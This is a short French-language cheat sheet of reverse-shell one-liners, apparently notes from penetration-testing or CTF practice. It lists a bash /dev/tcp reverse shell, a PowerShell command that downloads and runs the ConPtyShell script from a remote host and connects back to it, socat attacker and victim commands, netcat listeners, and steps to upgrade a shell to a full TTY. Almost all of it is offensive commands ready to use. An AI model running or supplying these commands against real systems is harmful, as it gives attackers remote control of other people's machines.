Bash dans bash est parfois nécessaire?
```bash -c ‘bash -i >& /dev/tcp/192.168.49.168/80 0>&1'```

# Windows
## CONPTYSHELL
Client Side: Windows version >= 10 / 2019 1809 (build >= 10.0.17763)
Server Side: any tcp listener, i.e. netcat
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~powershell
#server
stty raw -echo; (stty size; cat) | nc -lvnp 3001
#client
IEX(IWR http://10.10.14.131/windows/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.10.14.131 3001
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# Linux
## Socat
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ shell
#attaquant
socat file:`tty`,raw,echo=0 tcp-listen:4444
#Victime
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
## Upgrade
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ shell
script -qc /bin/bash /dev/null
#ou
python3 -c 'import pty; pty.spawn("/bin/bash")'
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Trouver terminal et taille du TTY (rows, collumns)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#CTRL-Z
echo $TERM
stty -a
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
stty raw -echo
fg
reset
export SHELL=bash && export TERM=xterm-256color
stty rows 24 columns 115
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
